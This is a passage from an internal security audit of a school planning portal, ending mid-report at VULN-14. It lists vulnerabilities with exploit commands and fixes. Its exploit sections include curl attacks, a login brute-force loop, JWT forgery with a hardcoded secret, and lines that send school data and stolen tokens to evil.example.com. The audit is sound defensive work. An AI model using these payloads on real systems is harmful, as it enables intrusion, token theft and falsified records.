# Security Audit Report — AIP-PIR Portal

**Date:** 2026-03-15
**Version Audited:** 1.0.0-beta
**Auditor:** Internal Security Review
**Classification:** Internal Use Only — Do Not Distribute

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope and Methodology](#scope-and-methodology)
3. [Threat Model](#threat-model)
4. [Vulnerability Index](#vulnerability-index)
5. [Critical Vulnerabilities](#critical-vulnerabilities)
   - [VULN-01: No Authentication Middleware on Data Routes](#vuln-01-no-authentication-middleware-on-data-routes)
   - [VULN-02: Insecure Direct Object Reference — Draft Read/Delete](#vuln-02-insecure-direct-object-reference--draft-readdelete)
   - [VULN-03: Insecure Direct Object Reference — Draft Creation](#vuln-03-insecure-direct-object-reference--draft-creation)
   - [VULN-04: Weak JWT Secret with Hardcoded Fallback](#vuln-04-weak-jwt-secret-with-hardcoded-fallback)
   - [VULN-05: Wildcard CORS Policy](#vuln-05-wildcard-cors-policy)
6. [High Severity Vulnerabilities](#high-severity-vulnerabilities)
   - [VULN-06: No School-Level Authorization on AIP/PIR Creation](#vuln-06-no-school-level-authorization-on-aippir-creation)
   - [VULN-07: No Input Validation on Registration](#vuln-07-no-input-validation-on-registration)
   - [VULN-08: Plaintext Database Credentials in .env](#vuln-08-plaintext-database-credentials-in-env)
   - [VULN-09: Unbounded parseInt/parseFloat Without NaN or Range Checks](#vuln-09-unbounded-parseintparsefloat-without-nan-or-range-checks)
   - [VULN-10: Unsanitized File Path from Database Used in File Operations](#vuln-10-unsanitized-file-path-from-database-used-in-file-operations)
   - [VULN-11: No Rate Limiting on Authentication Endpoints](#vuln-11-no-rate-limiting-on-authentication-endpoints)
7. [Medium Severity Vulnerabilities](#medium-severity-vulnerabilities)
   - [VULN-12: JWT Token Stored in localStorage](#vuln-12-jwt-token-stored-in-localstorage)
   - [VULN-13: Client-Side PIR Route Guard Bypass via localStorage Flag](#vuln-13-client-side-pir-route-guard-bypass-via-localstorage-flag)
   - [VULN-14: Arbitrary Role Assignment on Registration](#vuln-14-arbitrary-role-assignment-on-registration)
   - [VULN-15: Sensitive PII Embedded in JWT Payload](#vuln-15-sensitive-pii-embedded-in-jwt-payload)
   - [VULN-16: Verbose Error Responses and Enumeration Risk](#vuln-16-verbose-error-responses-and-enumeration-risk)
   - [VULN-17: No Email Format Validation or Verification](#vuln-17-no-email-format-validation-or-verification)
   - [VULN-22: Open Registration Endpoint — No Admin Gate](#vuln-22-open-registration-endpoint--no-admin-gate)
   - [VULN-23: Frontend Never Sends Token — Auth Header Absent on All API Calls](#vuln-23-frontend-never-sends-token--auth-header-absent-on-all-api-calls)
   - [VULN-24: Unsafe JSON.parse on localStorage Without Error Handling](#vuln-24-unsafe-jsonparse-on-localstorage-without-error-handling)
8. [Low Severity Vulnerabilities](#low-severity-vulnerabilities)
   - [VULN-18: No CSRF Protection](#vuln-18-no-csrf-protection)
   - [VULN-19: Missing Security Response Headers](#vuln-19-missing-security-response-headers)
   - [VULN-20: No Content Security Policy](#vuln-20-no-content-security-policy)
   - [VULN-21: No Audit Logging](#vuln-21-no-audit-logging)
   - [VULN-25: Deno Permission Flags Missing --allow-write](#vuln-25-deno-permission-flags-missing---allow-write)
   - [VULN-26: Aggressive Cascade Deletes — No Soft Delete or Archive](#vuln-26-aggressive-cascade-deletes--no-soft-delete-or-archive)
   - [VULN-27: Expired JWT Never Invalidated on the Client](#vuln-27-expired-jwt-never-invalidated-on-the-client)
   - [VULN-28: Dev Utility Functions Ship in Production Bundle](#vuln-28-dev-utility-functions-ship-in-production-bundle)
9. [Attack Chains](#attack-chains)
10. [Remediation Priority Matrix](#remediation-priority-matrix)
11. [Recommended Fixes Overview](#recommended-fixes-overview)

---

## Executive Summary

A full code-level security review of the AIP-PIR Portal was conducted against the `1.0.0-beta` release. The audit examined all backend routes, authentication logic, database schema, and frontend access controls.

**5 Critical, 6 High, 9 Medium, and 8 Low** vulnerabilities were identified. The most severe findings collectively allow an **unauthenticated attacker to read, create, and delete any user's data** without any credentials whatsoever. A second attack chain allows **complete privilege escalation** by self-assigning the highest privilege role at registration time. These issues must be resolved before this system handles real DepEd data.

| Severity | Count |
|----------|-------|
| Critical | 5 |
| High | 6 |
| Medium | 9 |
| Low | 8 |
| **Total** | **28** |

---

## Scope and Methodology

### In Scope
- `server/server.ts` — Hono application bootstrap and CORS
- `server/routes/auth.ts` — Registration and login endpoints
- `server/routes/data.ts` — All data management endpoints
- `server/prisma/schema.prisma` — Database schema
- `react-app/src/App.jsx` — Route guards and dashboard
- `react-app/src/Login.jsx` — Token storage after login

### Methodology
- **Static code analysis** — Manual line-by-line review of all route handlers
- **Authentication flow tracing** — Verified which routes require a valid token
- **Authorization logic review** — Checked whether authenticated identity is compared against requested resources
- **Data flow analysis** — Tracked untrusted input from HTTP request through to database and filesystem
- **Client-side control review** — Assessed React route guards and localStorage usage
- **Attack chain construction** — Chained individual vulnerabilities to demonstrate maximum realistic impact

---

## Threat Model

### Actors

| Actor | Description | Trust Level |
|-------|-------------|-------------|
| Authenticated School User | A logged-in teacher or school administrator from a specific school | Low trust — can only see their own school's data |
| Division Personnel | Logged-in DepEd division monitor | Medium trust — read access across assigned programs |
| Unauthenticated User | Any anonymous visitor with network access to port 3001 | Zero trust |
| Malicious Insider | A legitimately registered school user attempting to access rival school data | Adversarial |

### Assets to Protect

- **Draft form data** — Partial AIP/PIR submissions containing budgets, plans, and personnel names
- **Submitted AIP/PIR records** — Finalized planning and review documents
- **User credentials** — Email and bcrypt-hashed passwords in the database
- **School and program metadata** — Structural information about the division
- **Server filesystem** — Files in `server/data/drafts/`

---

## Vulnerability Index

| ID | Title | Severity | File | Line(s) |
|----|-------|----------|------|---------|
| VULN-01 | No auth middleware on data routes | Critical | `server/routes/data.ts` | 1–351 |
| VULN-02 | IDOR — draft read/delete | Critical | `server/routes/data.ts` | 71–133 |
| VULN-03 | IDOR — draft creation | Critical | `server/routes/data.ts` | 14–69 |
| VULN-04 | Weak JWT secret fallback | Critical | `server/routes/auth.ts` | 7 |
| VULN-05 | Wildcard CORS | Critical | `server/server.ts` | 8 |
| VULN-06 | No school-level authz on AIP/PIR | High | `server/routes/data.ts` | 192–349 |
| VULN-07 | No input validation on registration | High | `server/routes/auth.ts` | 9–32 |
| VULN-08 | Plaintext DB credentials in .env | High | `server/.env` | 2 |
| VULN-09 | Unbounded parseInt/parseFloat | High | `server/routes/data.ts` | 74, 106, 174–175 |
| VULN-10 | Unsanitized file path from DB | High | `server/routes/data.ts` | 90, 119 |
| VULN-11 | No rate limiting on auth | High | `server/routes/auth.ts` | 9–74 |
| VULN-12 | JWT in localStorage | Medium | `react-app/src/Login.jsx` | 72–73 |
| VULN-13 | Client-side PIR guard bypass | Medium | `react-app/src/App.jsx` | 97–100, 407–409 |
| VULN-14 | Arbitrary role on registration | Medium | `server/routes/auth.ts` | 11, 21 |
| VULN-15 | PII in JWT payload | Medium | `server/routes/auth.ts` | 52–53 |
| VULN-16 | Verbose error / enumeration | Medium | `server/routes/auth.ts` | 43–45 |
| VULN-17 | No email validation | Medium | `server/routes/auth.ts` | 10 |
| VULN-18 | No CSRF protection | Low | `server/server.ts` | 8 |
| VULN-19 | Missing security headers | Low | `server/server.ts` | global |
| VULN-20 | No Content Security Policy | Low | `server/server.ts` | global |
| VULN-21 | No audit logging | Low | all routes | — |
| VULN-22 | Open registration — no admin gate | Medium | `server/routes/auth.ts` | 9–32 |
| VULN-23 | Frontend never sends Authorization header | Medium | `react-app/src/AIPForm.jsx`, `PIRForm.jsx` | all axios calls |
| VULN-24 | Unsafe JSON.parse on localStorage | Medium | `react-app/src/App.jsx` | 51, 107, 303 |
| VULN-25 | Deno missing --allow-write permission | Low | `server/deno.json` | 4–5 |
| VULN-26 | Aggressive cascade deletes — no archive | Low | `server/prisma/schema.prisma` | 32, 103, 137 |
| VULN-27 | Expired JWT never invalidated on client | Low | `react-app/src/App.jsx` | 37–42 |
| VULN-28 | Dev utility functions in production bundle | Low | `react-app/src/PIRForm.jsx` | 198–212 |

---

## Critical Vulnerabilities

---

### VULN-01: No Authentication Middleware on Data Routes

**Severity:** Critical
**File:** `server/routes/data.ts` — entire file (lines 1–351)
**CWE:** CWE-306 — Missing Authentication for Critical Function

#### Description

The backend registers two route groups:

```ts
// server/server.ts
app.route('/api/auth', authRoutes);  // login, register
app.route('/api', dataRoutes);       // ALL data — no auth applied
```

`dataRoutes` contains every sensitive endpoint — drafts, schools, clusters, programs, AIP creation, PIR creation — and **none of them verify that the caller has a valid JWT token**. There is no middleware on the `dataRoutes` Hono instance, and no individual handler inspects the `Authorization` header.

#### How to Exploit

An attacker does not need any account or credentials. They only need network access to port `3001`.

```bash
# Dump every school in the system
curl http://localhost:3001/api/schools

# Dump every cluster and its associated schools
curl http://localhost:3001/api/clusters

# Dump every program (including restricted ALS/SPED programs)
curl http://localhost:3001/api/programs

# Check if school ID 3 has submitted an AIP for 2026
curl "http://localhost:3001/api/schools/3/aip-status?year=2026"

# Create an AIP for school 3 — forging a submission on their behalf
curl -X POST http://localhost:3001/api/aips \
  -H "Content-Type: application/json" \
  -d '{"school_id": 3, "program_title": "Regular", "year": 2026, "outcome": "Injected", ...}'

# Submit a PIR for any school without their knowledge
curl -X POST http://localhost:3001/api/pirs \
  -H "Content-Type: application/json" \
  -d '{"school_name": "Guihulngan Central School", "program_title": "Regular", "quarter": "1st Quarter CY 2026", ...}'
```

No token. No session. No account required.

#### Impact

- Any visitor on the same network (LAN, school Wi-Fi) can read all institutional planning data
- Any visitor can forge AIP or PIR submissions on behalf of any school
- Any visitor can check AIP submission status for any school, leaking submission timelines
- All school and cluster structural data is exposed to the public internet if the server is not firewalled

#### Recommendation

Apply a JWT verification middleware to the entire `dataRoutes` group before mounting it:

```ts
// Verify token before processing any /api data route
dataRoutes.use('*', async (c, next) => {
  const authHeader = c.req.header('Authorization');
  if (!authHeader?.startsWith('Bearer ')) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  try {
    const payload = jwt.verify(authHeader.slice(7), JWT_SECRET);
    c.set('user', payload);
    await next();
  } catch {
    return c.json({ error: 'Invalid or expired token' }, 401);
  }
});
```

---

### VULN-02: Insecure Direct Object Reference — Draft Read/Delete

**Severity:** Critical
**File:** `server/routes/data.ts` — lines 71–133
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

#### Description

The draft retrieval and deletion endpoints accept a `userId` directly from the URL path parameter. Even if authentication were in place (it currently is not per VULN-01), neither endpoint verifies that the `userId` in the URL matches the identity of the authenticated caller.

```ts
// GET /api/drafts/:formType/:userId
dataRoutes.get('/drafts/:formType/:userId', async (c) => {
  const userId = parseInt(c.req.param('userId'));  // taken directly from URL
  const draft = await prisma.draft.findUnique({
    where: { user_id_form_type: { user_id: userId, form_type: formType } }
  });
  // ...returns draft data to anyone
});

// DELETE /api/drafts/:formType/:userId
dataRoutes.delete('/drafts/:formType/:userId', async (c) => {
  const userId = parseInt(c.req.param('userId'));  // taken directly from URL
  // ...deletes without owner check
});
```

#### How to Exploit

If an attacker knows (or can enumerate) user IDs — which are sequential integers — they can read or destroy any user's in-progress draft:

```bash
# Read user 1's in-progress AIP draft (could contain budget plans, signatory names)
curl http://localhost:3001/api/drafts/AIP/1

# Read user 2's PIR draft
curl http://localhost:3001/api/drafts/PIR/2

# Enumerate all drafts by brute-forcing user IDs 1–1000
for i in $(seq 1 1000); do
  curl -s "http://localhost:3001/api/drafts/AIP/$i" | grep -q "hasDraft\":true" && echo "Draft found for user $i"
done

# Destroy user 5's AIP draft — causing them to lose unsaved work
curl -X DELETE http://localhost:3001/api/drafts/AIP/5
```

Because user IDs are auto-incrementing integers starting at 1, enumeration takes seconds.

#### Impact

- Any user's draft form data (budget figures, personnel names, project plans) can be read
- Any user's draft can be silently deleted before they submit, causing data loss
- A rival school's personnel could sabotage another school's submission

#### Recommendation

After adding authentication middleware (VULN-01 fix), compare the URL `userId` against the authenticated token's `id` claim:

```ts
const caller = c.get('user');
if (caller.id !== userId && caller.role !== 'Division Personnel') {
  return c.json({ error: 'Forbidden' }, 403);
}
```

---

### VULN-03: Insecure Direct Object Reference — Draft Creation

**Severity:** Critical
**File:** `server/routes/data.ts` — lines 14–69
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

#### Description

The draft creation (`POST /api/drafts`) endpoint accepts `user_id` from the request body. The server trusts this value without checking whether it corresponds to the authenticated user:

```ts
dataRoutes.post('/drafts', async (c) => {
  const { user_id, form_type, draft_data } = await c.req.json();
  // user_id is used directly — no check against token identity
  const draft = await prisma.draft.upsert({
    where: { user_id_form_type: { user_id: parseInt(user_id), ... } },
    ...
  });
});
```

#### How to Exploit

An attacker can overwrite any user's existing draft with malicious or empty content:

```bash
# Overwrite user 7's AIP draft with garbage data, destroying their work
curl -X POST http://localhost:3001/api/drafts \
  -H "Content-Type: application/json" \
  -d '{"user_id": 7, "form_type": "AIP", "draft_data": {"destroyed": true}}'

# Plant a fake draft in user 12's account with pre-filled malicious content
curl -X POST http://localhost:3001/api/drafts \
  -H "Content-Type: application/json" \
  -d '{"user_id": 12, "form_type": "PIR", "draft_data": {"budget": 0, "activities": []}}'
```

If a user later loads and submits this tampered draft, they would unknowingly submit falsified data to the division office.

#### Impact

- Silent overwrite of any user's active draft with attacker-controlled content
- Could lead to submission of falsified AIP/PIR data under the victim's identity
- Denial of service against a specific school's submission workflow

#### Recommendation

`user_id` must never come from the request body for ownership operations. Extract it exclusively from the verified JWT token:

```ts
const caller = c.get('user'); // set by auth middleware
const user_id = caller.id;    // always use token identity, never body
```

---

### VULN-04: Weak JWT Secret with Hardcoded Fallback

**Severity:** Critical
**File:** `server/routes/auth.ts` — line 7
**CWE:** CWE-321 — Use of Hard-coded Cryptographic Key

#### Description

The JWT signing secret is loaded from an environment variable, but a plaintext fallback is hardcoded directly in the source code:

```ts
const JWT_SECRET = Deno.env.get("JWT_SECRET") || "super-secret-default-key-change-me-in-production";
```

If the environment variable `JWT_SECRET` is not set — which is likely during development, first-time setup, or misconfigured deployments — the application silently falls back to this well-known default string. The string is now also permanently embedded in the git history.

#### How to Exploit

An attacker who reads this source file (or the git history) knows the exact secret used to sign tokens. They can forge a valid token for **any user identity** without ever logging in:

```js
// Attacker runs this locally — no server access needed
const jwt = require('jsonwebtoken');

// Forge a Division Personnel token with full read access
const forgedToken = jwt.sign(
  {
    id: 1,
    email: "admin@deped.gov.ph",
    role: "Division Personnel",
    school_id: null,
    name: "Forged Admin"
  },
  "super-secret-default-key-change-me-in-production",  // the known default
  { expiresIn: '365d' }
);

console.log(forgedToken);
// Use this token on any endpoint once auth middleware is added
```

Even after authentication middleware is added (VULN-01 fix), this vulnerability would completely nullify it.

#### Impact

- Complete authentication bypass — forge tokens for any user, any role
- Persistent: the insecure default is in git history even after the code is changed
- Silently active in any environment where the env var was not explicitly set

#### Recommendation

1. Remove the fallback entirely. Fail loudly on startup if the secret is missing:
   ```ts
   const JWT_SECRET = Deno.env.get("JWT_SECRET");
   if (!JWT_SECRET) throw new Error("FATAL: JWT_SECRET environment variable is not set");
   ```
2. Generate a strong secret: `openssl rand -hex 64`
3. Rotate all existing tokens by changing the secret (all current sessions will be invalidated — this is intentional)
4. Add `JWT_SECRET` to `.env.example` with a placeholder, never a real value

---

### VULN-05: Wildcard CORS Policy

**Severity:** Critical
**File:** `server/server.ts` — line 8
**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains

#### Description

The server applies the Hono CORS middleware globally with no configuration:

```ts
app.use('*', cors());
```

With default Hono CORS settings, this allows **any origin** to make requests to the API. This means a malicious webpage — even one hosted on an attacker's server — can issue requests to this backend in the context of a logged-in user's browser.

#### How to Exploit

An attacker hosts a malicious website and social-engineers a school administrator (e.g., via a phishing link) into visiting it:

```html
<!-- attacker's page at http://evil.example.com -->
<script>
  // The victim's browser already has the token in localStorage
  const token = null; // localStorage isn't cross-origin readable BUT...

  // With wildcard CORS, the attacker CAN make credentialed requests
  // if cookies are used instead. With localStorage tokens + wildcard CORS,
  // the CORS header misleads developers into thinking it's safe.

  // More critically: wildcard CORS means the response is readable
  // by attacker JS if the user is tricked into running this script
  // within the same origin (e.g., through a stored XSS).

  // Immediate impact: enumerate all schools from any external site
  fetch('http://TARGET_SERVER:3001/api/schools')
    .then(r => r.json())
    .then(data => {
      // Exfiltrate full school list to attacker's server
      fetch('http://evil.example.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

Additionally, wildcarded CORS prevents browsers from protecting users through the Same-Origin Policy for unauthenticated endpoints (of which there are currently many — see VULN-01).

#### Impact

- Any external website can read all unauthenticated API responses
- Combined with VULN-01, this means the entire database is externally readable from any browser
- Once authentication is added, wildcard CORS still enables cross-site request forgery if not paired with CSRF protection

#### Recommendation

Restrict CORS to the exact frontend origin:

```ts
app.use('*', cors({
  origin: ['http://localhost:5173', 'https://your-production-domain.com'],
  allowMethods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'Authorization'],
}));
```

---

## High Severity Vulnerabilities

---

### VULN-06: No School-Level Authorization on AIP/PIR Creation

**Severity:** High
**File:** `server/routes/data.ts` — lines 192–349
**CWE:** CWE-285 — Improper Authorization

#### Description

Even if a valid JWT token is checked in the future, the AIP and PIR creation endpoints accept `school_id` and `school_name` directly from the request body without verifying whether the authenticated user belongs to that school:

```ts
// POST /api/aips — school_id comes from body, never compared to token
const { school_id, program_title, year, ... } = body;
const aip = await prisma.aIP.create({
  data: { school_id: parseInt(school_id), ... }
});

// POST /api/pirs — school_name from body, resolved to school.id without ownership check
const school = await prisma.school.findFirst({ where: { name: school_name } });
```

#### How to Exploit

A legitimately registered school user (e.g., from School A) can submit AIP/PIR records on behalf of any other school:

```bash
# Logged in as school user for "Guihulngan Central School" (school_id=1)
# But submitting an AIP for a completely different school (school_id=5)
curl -X POST http://localhost:3001/api/aips \
  -H "Authorization: Bearer <my_valid_token>" \
  -H "Content-Type: application/json" \
  -d '{"school_id": 5, "program_title": "Regular", "year": 2026, ...}'
```

This could be used to:
- Forge submissions that make another school appear compliant when they are not
- Mark another school's AIP as submitted to unlock their PIR form (circumventing the VULN-13 guard)
- Submit false or misleading quarterly reviews under another school's identity

#### Impact

- Cross-school data tampering by any authenticated user
- Falsification of official planning documents
- Subversion of the AIP-before-PIR workflow across schools

#### Recommendation

After adding auth middleware, always derive `school_id` from the JWT token for school-level users, never from the request body:

```ts
const caller = c.get('user');
if (caller.role === 'School') {
  // Override any body-supplied school_id with the token's authoritative value
  school_id = caller.school_id;
}
```

---

### VULN-07: No Input Validation on Registration

**Severity:** High
**File:** `server/routes/auth.ts` — lines 9–32
**CWE:** CWE-20 — Improper Input Validation

#### Description

The registration endpoint passes all fields directly from the request body into Prisma without any format, length, or type validation:

```ts
authRoutes.post('/register', async (c) => {
  const body = await c.req.json();
  const { email, password, role, name, school_id } = body;
  // No validation whatsoever — goes straight to DB
  const hashedPassword = await bcrypt.hash(password, salt);
  const user = await prisma.user.create({ data: { email, password: hashedPassword, role, name, school_id } });
});
```

#### How to Exploit

```bash
# Register with a single-character password — account is instantly brute-forceable
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "password": "a", "role": "School", "name": "Test", "school_id": 1}'

# Register with a non-email string as email — breaks any future password reset flow
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "notanemail", "password": "pass", "role": "School", "name": "X", "school_id": 1}'

# Register with an extremely long name/email to probe for buffer issues
python3 -c "
import json, requests
requests.post('http://localhost:3001/api/auth/register', json={
  'email': 'A' * 10000 + '@x.com',
  'password': 'B' * 10000,
  'role': 'School',
  'name': 'C' * 10000,
  'school_id': 1
})
"
```

Also see VULN-14 — the `role` field is accepted here with no whitelist, allowing privilege escalation.

#### Impact

- Accounts with single-character passwords are trivially brute-forced offline if password hashes are ever leaked
- Malformed emails render account recovery impossible
- Large payloads could cause memory pressure or Prisma errors

#### Recommendation

Validate all fields before touching the database:

```ts
if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
  return c.json({ error: 'Invalid email format' }, 400);
}
if (!password || password.length < 12) {
  return c.json({ error: 'Password must be at least 12 characters' }, 400);
}
if (!['School', 'Division Personnel'].includes(role)) {
  return c.json({ error: 'Invalid role' }, 400);
}
if (name && name.length > 255) {
  return c.json({ error: 'Name too long' }, 400);
}
```

---

### VULN-08: Plaintext Database Credentials in .env

**Severity:** High
**File:** `server/.env`
**CWE:** CWE-312 — Cleartext Storage of Sensitive Information

#### Description

The `.env` file contains the full database connection string including the plaintext PostgreSQL password:

```
DATABASE_URL="postgresql://postgres:password@localhost:5432/pir_system?schema=public"
```

While `.env` files are typically excluded from git via `.gitignore`, this remains dangerous if:
- A developer accidentally runs `git add .` and commits it
- The file is readable by other system users
- The server is shared or the file is left on a compromised machine
- CI/CD pipelines log environment variables

The password `password` is also trivially weak.

#### Impact

- Direct database compromise if the file is exposed
- Anyone with database access can bypass the application entirely and read/write all records
- Can be combined with VULN-10 (path traversal) to exfiltrate the file if server-side reads are exploitable

#### Recommendation

1. Change the database password immediately to a strong random value: `openssl rand -base64 32`
2. Ensure `.env` is in `.gitignore` — verify with `git check-ignore -v server/.env`
3. Add a `server/.env.example` with placeholder values and document it
4. Rotate credentials if the file has ever been committed to version history

---

### VULN-09: Unbounded parseInt/parseFloat Without NaN or Range Checks

**Severity:** High
**File:** `server/routes/data.ts` — lines 74, 106, 174–175, 241, 318
**CWE:** CWE-20 — Improper Input Validation

#### Description

Numeric values from URL parameters and request bodies are parsed without checking for `NaN`, negative values, or extreme values:

```ts
const userId = parseInt(c.req.param('userId'));       // NaN if param is "abc"
const school_id = parseInt(school_id);                 // NaN if undefined
const year = parseInt(c.req.query('year') || ...);    // unchecked range
const budget_amount = parseFloat(act.budgetAmount || 0); // can be Infinity, NaN
```

#### How to Exploit

```bash
# Passing "abc" as userId — parseInt returns NaN — Prisma receives NaN
# Behavior is ORM-dependent but could cause unintended query matches or server errors
curl http://localhost:3001/api/drafts/AIP/abc

# Pass a negative user ID — might match no record or cause unexpected behavior
curl http://localhost:3001/api/drafts/AIP/-1

# Pass a year far in the future to create orphaned records
curl "http://localhost:3001/api/schools/1/aip-status?year=99999"

# Inject Infinity as budget — may break financial calculations or PDF rendering
curl -X POST http://localhost:3001/api/aips \
  -H "Content-Type: application/json" \
  -d '{"activities": [{"budgetAmount": "Infinity", ...}], ...}'
```

`parseFloat("Infinity")` returns JavaScript's `Infinity` value. Passing this to Prisma's Decimal field may throw an error or silently store an invalid value.

#### Impact

- Unexpected server errors that reveal stack traces (information leakage)
- Potential for inserting invalid financial data into the database
- Edge cases in Prisma query behavior with `NaN` IDs

#### Recommendation

Validate and guard all numeric parsing:

```ts
function parseIntStrict(val: string | undefined, min = 1): number | null {
  const n = parseInt(val ?? '');
  if (isNaN(n) || n < min) return null;
  return n;
}
const userId = parseIntStrict(c.req.param('userId'));
if (!userId) return c.json({ error: 'Invalid user ID' }, 400);
```

---

### VULN-10: Unsanitized File Path from Database Used in File Operations

**Severity:** High
**File:** `server/routes/data.ts` — lines 90, 119
**CWE:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

#### Description

When loading or deleting a draft, the server reads the `file_path` column value directly from the database and passes it to `Deno.readTextFile()` and `Deno.remove()` without verifying the path stays within the expected `data/drafts/` directory:

```ts
// Line 90 — file path from DB used directly
const draftDataStr = await Deno.readTextFile(draft.file_path);

// Line 119 — file path from DB used directly for deletion
await Deno.remove(draft.file_path);
```

#### How to Exploit

This requires prior database write access (achievable via VULN-03). An attacker writes a malicious `file_path` value into the `Draft` table, then triggers the read endpoint to exfiltrate arbitrary files:

```bash
# Step 1: Write a draft record with a path-traversal file_path
# (via VULN-03, create a draft for any user ID with a poisoned file_path)
# The DB record ends up with file_path = "../../server/routes/auth.ts"

# Step 2: Trigger the read endpoint — server reads auth.ts source
curl http://localhost:3001/api/drafts/AIP/7
# Response contains the source code of auth.ts, including JWT_SECRET

# Step 3: Trigger delete to destroy a critical file
# curl -X DELETE http://localhost:3001/api/drafts/AIP/7
# Server executes: Deno.remove("../../deno.json") — deletes configuration
```

Practically, this requires database write access first, but that is achievable via VULN-03 (no auth on draft creation endpoint).

#### Impact

- Arbitrary file read from the server's filesystem
- Arbitrary file deletion
- Can be chained with VULN-03 and VULN-01 to exfiltrate `.env`, source files, or Prisma schema without any credentials

#### Recommendation

Validate that the resolved path is strictly inside the expected directory before performing any file operation:

```ts
const safePath = path.resolve(draft.file_path);
const safeBase = path.resolve(DRAFTS_DIR);
if (!safePath.startsWith(safeBase + path.sep)) {
  return c.json({ error: 'Invalid draft reference' }, 400);
}
await Deno.readTextFile(safePath);
```

---

### VULN-11: No Rate Limiting on Authentication Endpoints

**Severity:** High
**File:** `server/routes/auth.ts` — lines 9–74
**CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts

#### Description

The `/api/auth/login` and `/api/auth/register` endpoints accept unlimited requests per IP address. There is no throttle, lockout, or CAPTCHA.

#### How to Exploit

**Brute-force login attack:**

```bash
# Iterate a password list against a known school email
while read pass; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"principal@guihulngan.deped.gov.ph\", \"password\": \"$pass\"}")
  if [ "$code" = "200" ]; then
    echo "Found: $pass"; break
  fi
done < common_passwords.txt
```

With a 100 Mbps LAN connection, this can attempt thousands of passwords per second. Given that VULN-07 allows weak passwords (as short as 1 character), the attack surface is especially large.

**Account enumeration via registration:**

```bash
# Test if an email is already registered
curl -X POST http://localhost:3001/api/auth/register \
  -d '{"email": "target@school.edu.ph", "password": "test", "role": "School", "name": "Test", "school_id": 1}'
# Prisma's unique constraint error on duplicate email reveals account existence
```

#### Impact

- Password brute-forcing against any known email
- Account enumeration via registration error messages
- Denial-of-service against specific accounts through lockout abuse (if lockout is later added naively)

#### Recommendation

- Add per-IP rate limiting: max 5 login attempts per minute
- Implement progressive delay after failed attempts (e.g., 1s, 2s, 4s, 8s backoff)
- Consider account lockout after 10 consecutive failures with admin-unlock capability
- Return identical generic error messages for both "user not found" and "wrong password" to prevent enumeration

---

## Medium Severity Vulnerabilities

---

### VULN-12: JWT Token Stored in localStorage

**Severity:** Medium
**File:** `react-app/src/Login.jsx` — lines 72–73; `react-app/src/App.jsx` — line 38
**CWE:** CWE-922 — Insecure Storage of Sensitive Information

#### Description

After a successful login, the JWT token and full user object are persisted to `localStorage`:

```js
// Login.jsx
localStorage.setItem('token', token);
localStorage.setItem('user', JSON.stringify(user));

// App.jsx — read back on every page load
const token = localStorage.getItem('token');
```

`localStorage` is accessible to **any JavaScript running on the same origin**. If an XSS vulnerability exists (even a minor one), the attacker can immediately steal the token and impersonate the user from a different machine.

#### How to Exploit

If any user-controlled input is ever rendered without proper escaping (e.g., a school name, activity description, or personnel name stored and then rendered without sanitization):

```js
// Attacker's payload in a stored input field rendered as HTML
<img src="x" onerror="fetch('http://evil.example.com/steal?t=' + localStorage.getItem('token'))">
```

The token is exfiltrated silently. The attacker then uses it from their own machine:

```bash
curl http://localhost:3001/api/drafts/AIP/1 \
  -H "Authorization: Bearer <stolen_token>"
```

The token is valid for 24 hours and persists in localStorage even after the browser tab is closed.

#### Impact

- Token theft via any future XSS vulnerability
- Persistent sessions (token lives 24h regardless of browser close)
- The full user object (including school_name and email) is also stored in plaintext

#### Recommendation

- Move to `sessionStorage` at minimum (cleared when tab is closed)
- Ideally, use HttpOnly cookies: the server sets a `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict` header, making the token inaccessible to JavaScript entirely
- If cookies are used, also add CSRF protection (see VULN-18)

---

### VULN-13: Client-Side PIR Route Guard Bypass via localStorage Flag

**Severity:** Medium
**File:** `react-app/src/App.jsx` — lines 97–100, 405–409
**CWE:** CWE-602 — Client-Side Enforcement of Server-Side Security

#### Description

The `PIRRouteGuard` component prevents access to the PIR form unless an AIP has been submitted. This is an important business rule. However, the guard can be bypassed by setting a `localStorage` flag:

```js
// App.jsx line 97–100
if (!hasAIP && localStorage.getItem('dev_pir_unlocked') !== 'true') {
  return <Navigate to="/" replace />;
}
```

This flag is intended for development use only, but it is controlled entirely by the client. There is no server-side check preventing PIR submission without an AIP.

Additionally, the dev button that sets this flag is conditionally rendered based on `import.meta.env.DEV`:

```js
// App.jsx lines 405–409
{import.meta.env.DEV && (
  <button onClick={() => {
    localStorage.setItem('dev_pir_unlocked', 'true');
    window.location.reload();
  }}>Dev: Unlock PIR</button>
)}
```

`import.meta.env.DEV` is `false` in production builds — so the button is hidden — but the **guard check on line 97 remains**, meaning any user can still type `localStorage.setItem('dev_pir_unlocked', 'true')` in the browser console to unlock PIR access regardless of environment.

#### How to Exploit

```js
// In browser DevTools console — works in any environment, including production
localStorage.setItem('dev_pir_unlocked', 'true');
location.reload();
// PIR form is now accessible without any AIP
```

Furthermore, since the backend `POST /api/pirs` also has no AIP-existence enforcement for the authenticated user (it only looks up whether *some* AIP exists for the school and year), a user can submit a PIR for any existing AIP in the database.

#### Impact

- Breaks the business rule that PIR requires an approved AIP
- Integrity of the review process is undermined
- A school can submit quarterly reviews with no corresponding planning document

#### Recommendation

1. Remove the `dev_pir_unlocked` localStorage check from `PIRRouteGuard` entirely
2. Enforce the AIP prerequisite on the backend: before creating a PIR, verify that an AIP with `school_id` matching the authenticated user's token exists for the given year
3. Use environment-specific test accounts for dev testing instead of bypass flags

---

### VULN-14: Arbitrary Role Assignment on Registration

**Severity:** Medium
**File:** `server/routes/auth.ts` — lines 11, 21
